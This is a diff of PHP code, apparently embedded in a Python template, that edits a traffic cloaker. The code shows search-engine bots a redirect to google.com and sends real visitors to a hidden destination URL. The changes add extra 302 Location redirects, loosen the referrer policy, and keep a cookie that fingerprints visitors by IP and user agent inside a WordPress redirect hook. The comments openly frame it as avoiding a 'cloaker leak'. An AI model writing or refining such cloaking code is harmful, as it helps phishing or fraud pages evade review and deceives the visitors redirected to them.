@@ -138,13 +138,14 @@ if (!empty($query)) {{
 // 🔥 HEADERS (TRACKING SAFE)
 header("Cache-Control: no-store, no-cache, must-revalidate");
 header("Pragma: no-cache");
-header("Referrer-Policy: strict-origin-when-cross-origin");
+header("Referrer-Policy: no-referrer-when-downgrade");
 header("X-Frame-Options: SAMEORIGIN");
 
 // 🔥 BOT → GOOGLE (NO CLOAKER LEAK)
 $redirect_to = $is_bot
     ? "https://www.google.com"
     : $final;
+header("Location: " . $redirect_to, true, 302);
     echo '<script>
 window.top.location.replace(' . json_encode($redirect_to) . ');
 </script>';
@@ -304,7 +305,8 @@ html, body {{
         setcookie('_ti_wp', md5($ip.$ua), time()+3600, '/', '', false, true);
     }}
     nocache_headers();
-    header("Referrer-Policy: strict-origin-when-cross-origin");
+    header("Referrer-Policy: no-referrer-when-downgrade");
+    header("Location: " . $redirect_to, true, 302);
     wp_safe_redirect($url, 302);
     exit;
 }});""",
